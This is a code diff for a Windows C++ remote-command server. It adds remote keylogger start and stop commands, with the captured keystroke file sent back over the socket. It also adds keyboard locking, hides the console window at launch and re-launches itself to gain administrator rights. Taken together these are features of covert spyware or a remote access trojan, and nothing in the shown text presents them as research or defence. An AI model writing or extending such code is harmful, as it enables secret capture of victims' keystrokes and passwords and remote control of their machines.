@@ -12,14 +12,15 @@
 #include <string>
 #include <winsock2.h>
 #include <ws2tcpip.h>
-#include "syscalls.h"
 #include <minwindef.h>
 #include <ws2def.h>
 #include <ws2ipdef.h>
 #include <minwinbase.h>
 #include <exception>
 #include <iosfwd>
+
 #include "const.h"
+#include "syscalls.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -70,6 +71,18 @@ static void handleRequest(std::string& request, std::string& response, std::stri
 			break;
 		case STOP_APP:
 			stopApp(params, response);
+			break;
+		case START_KEYLOGGER:
+			startKeylogger(response);
+			break;
+		case STOP_KEYLOGGER:
+			stopKeylogger(response, file);
+			break;
+		case LOCK_KEYBOARD:
+			lockKeyboard(response);
+			break;
+		case UNLOCK_KEYBOARD:
+			unlockKeyboard(response);
 			break;
 		default:
 			response = "Invalid command.";
@@ -208,10 +221,9 @@ static void startServer()
 				file.seekg(0, std::ios::beg);  // Rewind the file to start sending
 
 				char buffer[DEFAULT_BUFLEN];
-				
+
 				int i = 0;
 				while (file.read(buffer, DEFAULT_BUFLEN)) {
-					
 					iResult = send(ClientSocket, buffer, DEFAULT_BUFLEN, 0);
 					if (iResult == SOCKET_ERROR) {
 						std::cerr << "Send failed with error: " << WSAGetLastError() << std::endl;
@@ -255,6 +267,16 @@ static void startServer()
 
 int main()
 {
+	// Hide console window
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+	// Comment to debug
+	if (!isElevated()) {
+		// Request for elevation
+		restartAsAdmin();
+		return 0;
+	}
+
+
 	std::cout << "Server started." << std::endl;
 	try {
 		startServer();
